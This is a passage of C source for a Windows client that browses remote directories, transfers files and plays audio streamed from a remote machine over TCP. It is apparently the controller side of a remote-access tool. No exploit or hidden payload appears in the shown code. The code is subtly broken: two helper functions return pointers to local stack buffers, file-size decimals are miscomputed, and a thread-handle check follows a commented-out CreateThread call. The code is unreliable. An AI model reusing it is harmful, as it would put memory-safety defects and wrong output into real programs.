				ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
				SHGetFileInfo(data[0], 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				Item.iImage = FileInfo.iIcon;

				Item.iItem = 0;
				Item.lParam = (LPARAM)&data[0];
				Item.pszText = data[0];
				
				ListView_InsertItem(hListView, &Item);

//				memcpy(NetArray, data[1], datal[1]);

//				wsprintf(SizeBuf, "%d", NetArray[0]);
//				ListView_SetItemText(hListView, 0, 1, (LPSTR)SizeBuf);
//				wsprintf(SizeBuf, "%d", NetArray[1]);
//				ListView_SetItemText(hListView, 0, 2, (LPSTR)SizeBuf);

				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			}
		break;
		}

	case 129:
		//		 Download file
		if (datac > 1) {
			HANDLE hFile;
			DWORD dw;
			FILETRANSFERARGS *pArgs;
			pArgs = (FILETRANSFERARGS *)malloc(sizeof(FILETRANSFERARGS));

			int filesize;
			filesize = atoi(data[1]);

			hFile = CreateFile(data[0], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			//			Sleep(1000);
			if (hFile != INVALID_HANDLE_VALUE) {
				gbTransferring = true;
				pArgs->hFile = hFile;
				pArgs->hSocket = g_hTcpSocket;
				pArgs->FileSize = filesize;
				WSAAsyncSelect(g_hTcpSocket, g_hWnd, WM_MAINSOCKET, 0);
				ioctlsocket(g_hTcpSocket, FIONBIO, 0);
				CreateThread(NULL, 0, ReceiveFileThread, pArgs, 0, &dw);
			}
			//fixme: else?
		}
		break;

	case 302:
		wave_add_data(data[0]);
		break;
	case 303:
		initialize_wave(8000); // 8000 22050 44100
		break;
	case 304:
		waveOutClose(g_wave_out);
		waveOutReset(g_wave_out);
		break;

	default:
		// Invalid command
		break;
	}
}

void trim(char *s)
{
	// Trim spaces and tabs from beginning:
	int i=0,j;
	while((s[i]==' ')||(s[i]=='\t')) {
		i++;
	}
	if(i>0) {
		for(j=0;j<(int)strlen(s);j++) {
			s[j]=s[j+i];
		}
	s[j]='\0';
	}

	// Trim spaces and tabs from end:
	i=(int)strlen(s)-1;
	while((s[i]==' ')||(s[i]=='\t')) {
		i--;
	}
	if(i<((int)strlen(s)-1)) {
		s[i+1]='\0';
	}
}

// Another set of functions using the && operator:
void rtrim( char * string, char * trim )
{
	int i;
	for( i = (int)strlen(string) - 1; i >= 0 
	&& strchr ( trim, string[i] ) != NULL; i-- )
		// replace the string terminator:
		string[i] = '\0';
}

void ltrim( char * string, char * trim )
{
	while ( string[0] != '\0' && strchr ( trim, string[0] ) != NULL )
	{
		memmove( &string[0], &string[1], strlen(string) );
	}
}

void FileAttributesString(DWORD attr, char *buff)
{
  *buff++ = attr & FILE_ATTRIBUTE_ARCHIVE ? 'A' : ' ';
  *buff++ = attr & FILE_ATTRIBUTE_SYSTEM ? 'S' : ' ';
  *buff++ = attr & FILE_ATTRIBUTE_HIDDEN ? 'H' : ' ';
  *buff++ = attr & FILE_ATTRIBUTE_READONLY ? 'R' : ' ';
  *buff++ = attr & FILE_ATTRIBUTE_DIRECTORY ? 'D' : ' ';
  *buff++ = attr & FILE_ATTRIBUTE_ENCRYPTED ? 'E' : ' ';
  *buff++ = attr & FILE_ATTRIBUTE_COMPRESSED ? 'C' : ' ';
  *buff = '\0';
}

char* FileSizeString(char Buffer[1024], DWORD Number)
{
	int KB = 1024;
	int MB = KB*KB;
	int GB = KB*MB;
	DWORD DIV;
	char Units[3], Buf[1024];

	if ((int)Number>=GB)
	{
		DIV = GB;
		strcpy(Units,"GB");
	}
	else if ((int)Number>=MB)
	{
		DIV = MB;
		strcpy(Units,"MB");
	}
	else if ((int)Number>=KB)
	{
		DIV = KB;
		strcpy(Units,"KB");
	}
	else
	{
		DIV = 1;
		strcpy(Units," B");
	}

	if ((Number % DIV) % 100 > 0)
	{
		wsprintf(Buf, "%d.%d", (Number / DIV), (Number % DIV) % 100);
	}
	else
	{
		wsprintf(Buf, "%d", (Number / DIV));
	}

	lstrcat(Buf, Units);

	return Buf;
}

char* FileExtension(char *FileName)
{
	char filename[MAX_PATH];

	GetWindowsDirectory(filename, MAX_PATH);

	lstrcat(filename, TEXT("\\"));
	lstrcat(filename, FileName);

	return filename;
}

int CALLBACK CompareFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	if (strcmp(((FileEntry *)lParam1)->FileName, "..") == 0)
	{
		return -1;
	}
	if (strcmp(((FileEntry *)lParam2)->FileName, "..") == 0)
	{
		return 1;
	}
	if (((((FileEntry *)lParam1)->Data[2] & FILE_ATTRIBUTE_DIRECTORY) > 0) &&
		((((FileEntry *)lParam2)->Data[2] & FILE_ATTRIBUTE_DIRECTORY) == 0))
	{
		return -1;
	}
	if (((((FileEntry *)lParam1)->Data[2] & FILE_ATTRIBUTE_DIRECTORY) == 0) &&
		((((FileEntry *)lParam2)->Data[2] & FILE_ATTRIBUTE_DIRECTORY) > 0))
	{
		return 1;
	}
	return strcmpi(((FileEntry *)lParam1)->FileName, ((FileEntry *)lParam2)->FileName);
}

bool InputBox(char *caption, char *text, char *dst, int len)
{
	QueryCaption = caption;
	QueryText = text;
	QueryDst = dst;
	QueryLen = len;
	return (DialogBox(g_hInstance, MAKEINTRESOURCE(IDD_DLG_QUERY), g_hWndList, QueryDlgProc) == IDOK);
}

void UpOneLevel(char *Path)
{
	for (int i = (int)strlen(Path) - 2; i >= 0; i--)
	{
		if (Path[i] == '\\')
		{
			Path[i + 1] = 0;
			return;
		}
	}
}

void UpdateListing(char *NewPath, bool NoCache)
{
	LARGE_INTEGER t;

	// Load from cache without update?

	if (!NoCache)
	{
		for (int i = 0; i < g_iCacheCount; i++)
		{
			if (strcmp(g_pFileCache[i].Directory, NewPath) == 0)
			{
				// Set current path

				strcpy(g_szCurrentPath, NewPath);

				// Get timing to show off this incredible software

				QueryPerformanceCounter(&t);

				// Clear listview contents
				
				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);
				ListView_DeleteAllItems(hListView);
				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);

				// Display directory list in listview

				DWORD TotalSize;
				SHFILEINFO FileInfo;
				LVITEM Item;
				char SizeBuf[1024];

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

				Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
				Item.iSubItem = 0;
				TotalSize = 0;

				for (unsigned long j = 0; j < g_pFileCache[i].ListCount; j++)
				{
					// Get correct system icon index

					if ((g_pFileCache[i].FileList[j].Data[2] & FILE_ATTRIBUTE_DIRECTORY) > 0)
					{
						HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
						ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
						SHGetFileInfo("C:\\*.*", 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
						Item.iImage = FileInfo.iIcon;
					}
					else
					{
						HIMAGELIST ipSmallSystemImageList = (HIMAGELIST)SHGetFileInfo(FileExtension(g_pFileCache[i].FileList[j].FileName), 0, 
							&FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON | SHGFI_USEFILEATTRIBUTES);
						SendMessage(hListView, LVM_SETIMAGELIST, LVSIL_SMALL, (LPARAM)ipSmallSystemImageList);
						Item.iImage = FileInfo.iIcon;
					}

					
					Item.iItem = j;
					Item.lParam = (LPARAM)&g_pFileCache[i].FileList[j];
					Item.pszText = g_pFileCache[i].FileList[j].FileName;
					
					ListView_InsertItem(hListView, &Item);

					// Add size subitem

					if ((g_pFileCache[i].FileList[j].Data[2] & FILE_ATTRIBUTE_DIRECTORY) == 0)
					{
						wsprintf(SizeBuf, "%s", FileSizeString(SizeBuf, g_pFileCache[i].FileList[j].Data[1]));
						//wsprintf(SizeBuf, "%i", g_pFileCache[i].FileList[j].Data[1]);
						ListView_SetItemText(hListView, j, 1, SizeBuf);
					}

					TotalSize += g_pFileCache[i].FileList[j].Data[1];

					// Add attributes subitem

					FileAttributesString(g_pFileCache[i].FileList[j].Data[2], SizeBuf);
					trim(SizeBuf);
					//wsprintf(SizeBuf, "%i", g_pFileCache[i].FileList[j].Data[2]);
					ListView_SetItemText(hListView, j, 2, SizeBuf);			
				}

				ListView_SortItems(hListView, CompareFunc, 0);
				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);

				// Crude workaround to scrollbar screwing up sizing

				RECT Rect;

				GetClientRect(hListView, &Rect);
				ListView_SetColumnWidth(hListView, 0, Rect.right - Rect.left - 
					SIZE_COLUMN_WIDTH - ATTR_COLUMN_WIDTH);

				// Calculate time taken

				LARGE_INTEGER p;
				char buf[1024];

				QueryPerformanceCounter(&p);

				wsprintf(SizeBuf, "%s", FileSizeString(SizeBuf, TotalSize));
				//wsprintf(SizeBuf, "%i", TotalSize);
				sprintf(buf, "%d items (%s)", g_pFileCache[i].ListCount, SizeBuf);
				SendMessage(g_hStatus, SB_SETTEXT, 0, (LPARAM)(char *)buf);

				sprintf(buf, "Loaded from cache in %.3f seconds.", (float)(p.QuadPart - 
					t.QuadPart) / g_Frequency.QuadPart); 

				SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)(char *)buf);

				return;
			}
		}
	}

	// Put path in a format server will understand

	char Buf[MAX_PATH];
	strcpy(Buf, NewPath);

	if (Buf[strlen(Buf) - 1] != '\\')
	{
		strcat(Buf, "\\");
	}

	// If dir is cached, we will compare CRCs with server

	unsigned long argl[4];
	char *argv[4], blankhash[16];
	BOOL CRC;

	argv[0] = Buf;
	argv[1] = (char *)&t;
	argv[2] = (char *)&CRC;
	argl[0] = (int)strlen(Buf) + 1;
	argl[1] = sizeof(t);
	argl[2] = sizeof(CRC);

	QueryPerformanceCounter(&t);

	for (int i = 0; i < g_iCacheCount; i++)
	{
		if (strcmp(g_pFileCache[i].Directory, NewPath) == 0)
		{
			CRC = TRUE;
			g_bCheckingUpdate = true;

			argv[3] = (char *)g_pFileCache[i].CRC;
			argl[3] = sizeof(g_pFileCache[i].CRC);

			SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Checking CRCs...");
			//SendData(7, 4, argv, argl);
			SendStr((char *)"7", Buf);
			//UpdateListing(Buf, true);
			return;
		}
	}

	// Get updated listing

	argv[3] = (char *)blankhash;
	argl[3] = sizeof(blankhash);
	CRC = FALSE;
	g_bCheckingUpdate = false;
	SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Wait...");
	//SendData(7, 4, argv, argl);
	SendStr((char *)"7", Buf);
}

struct msghdr
{
	unsigned short cmd;
	unsigned short argc;
	unsigned long len;
};

//SOCKET g_hTcpSocket;
bool /*g_bConnected,*/ g_bConnecting, g_bTerminate, g_bThreadRunning;
HANDLE g_hTcpThread;
CRITICAL_SECTION g_csConnection;
int g_iPingHighest;

char g_szCurrentPath[MAX_PATH + 1];

unsigned long RecvQueueLen = 0, SendQueueLen = 0;
char *RecvQueue = 0, *SendQueue = 0;
unsigned long CipherType = 0;

BOOL ProcessMessage()
{
	MSG msg;
	if (PeekMessage(&msg, 0, 0, 0, PM_REMOVE)) 
	{
		if (msg.message == WM_QUIT)
		{
			return FALSE;
		}

		DispatchMessage(&msg);
		return TRUE;
	}
	return FALSE;
}

void ProcessMessages()
{
	while (ProcessMessage());
}

void TCPDisconnect()
{
	if (g_bConnecting)
	{
		SetRichText(CON_NORMAL, "Terminating connection attempt...");
		g_bTerminate = true;
		closesocket(g_hTcpSocket);
	}
	else if (g_bConnected)
	{
		SetRichText(CON_NORMAL, "Terminating current connection...");
		g_bTerminate = true;
		closesocket(g_hTcpSocket);
	}
	SetStatusBar("Not connected.");
}

void TCPConnect(char *Host)
{
	// Break any existing connection

	if (g_bConnected)
	{
		if (MessageBoxEx(g_hWnd, "Terminate current connection?", "Question", MB_YESNO | MB_ICONQUESTION, 0) != IDYES)
		{
			return;
		}
		TCPDisconnect();
	}
	else if (g_bConnecting)
	{
		TCPDisconnect();
	}

	// Idle until old thread terminates

	while (g_bThreadRunning)
	{
		ProcessMessages();
	}

	// Spawn socket thread

//	DWORD tid;

//	g_hTcpThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SocketThread, (LPVOID)strdup(Host), 0, &tid);
	if (g_hTcpThread == INVALID_HANDLE_VALUE)
	{
		SetRichText(CON_RED, "Fatal Error: Unable to create socket thread.");
	}
}

void TCPReconnect()
{
	// Break any existing connection

	if (g_bConnected)
	{
		if (MessageBoxEx(g_hWnd, "Terminate current connection?", "Question", MB_YESNO | MB_ICONQUESTION, 0) != IDYES)
		{
			return;
		}
		TCPDisconnect();
	}
	else if (g_bConnecting)
	{
		TCPDisconnect();
	}

	// Idle until old thread terminates

	while (g_bThreadRunning)
	{
		ProcessMessages();
	}

	SetRichText(CON_NORMAL, "No reconnect yet...");
}

void StartSendThread(SOCKET wParam)
{
	FILETRANSFERARGS *lpArgs;
	HANDLE h;
	DWORD dw;

	lpArgs = (FILETRANSFERARGS *)malloc(sizeof(FILETRANSFERARGS));
	lpArgs->hFile = g_hFile;
	lpArgs->hSocket = wParam;
	lpArgs->FileSize = GetFileSize(g_hFile, NULL);
	lpArgs->Offset = 0;

	if (lpArgs->Offset < lpArgs->FileSize)
	{
		h = CreateThread(NULL, 0, SendFileThread, lpArgs, CREATE_SUSPENDED, &dw);
		if (h == NULL)
		{
			CloseHandle(g_hFile);
		}
		else
		{
			ResumeThread(h);
			CloseHandle(h);
		}
	}
	else
	{
		CloseHandle(g_hFile);
	}
}